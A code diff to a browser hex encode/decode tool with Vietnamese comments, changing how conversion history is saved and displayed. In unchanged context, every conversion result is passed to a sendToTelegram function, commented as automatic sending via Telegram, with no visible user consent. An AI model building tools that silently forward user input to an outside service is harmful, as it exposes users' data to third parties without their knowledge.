@@ -7,13 +7,14 @@ function convertText(action) {
 
     if (action === 'encode') {
         output = encodeToHex(inputText);
+        saveToHistory(action, output); // Lưu kết quả mã hóa khi encode
     } else if (action === 'decode') {
         output = decodeFromHex(inputText);
+        saveToHistory(action, inputText); // Lưu dữ liệu gốc khi decode
     }
 
     document.getElementById('outputText').value = output;
     sendToTelegram(output); // Tự động gửi kết quả qua Telegram
-    saveToHistory(action, output); // Lưu kết quả vào lịch sử
 }
 
 // Hàm mã hóa chuỗi sang Hex
@@ -49,9 +50,14 @@ function sendToTelegram(outputText) {
 }
 
 // Lưu kết quả vào lịch sử
-function saveToHistory(action, outputText) {
-    if (outputText) {
-        history.push({ mode: action, output: outputText, timestamp: new Date().toLocaleString() });
+function saveToHistory(action, data) {
+    if (data) {
+        // Lưu nội dung kết quả encode (mã hóa) hoặc gốc khi decode
+        history.push({
+            mode: action,
+            content: data,
+            timestamp: new Date().toLocaleString()
+        });
     }
 }
 
@@ -72,7 +78,7 @@ function showHistory() {
     // Thêm các mục lịch sử vào modal
     history.forEach(item => {
         const li = document.createElement('li');
-        li.textContent = `${item.timestamp} - ${item.mode === 'encode' ? 'Encode' : 'Decode'}: ${item.output}`;
+        li.textContent = `${item.timestamp} - ${item.mode === 'encode' ? 'Encode' : 'Decode'}: ${item.content}`;
         historyList.appendChild(li);
     });
 
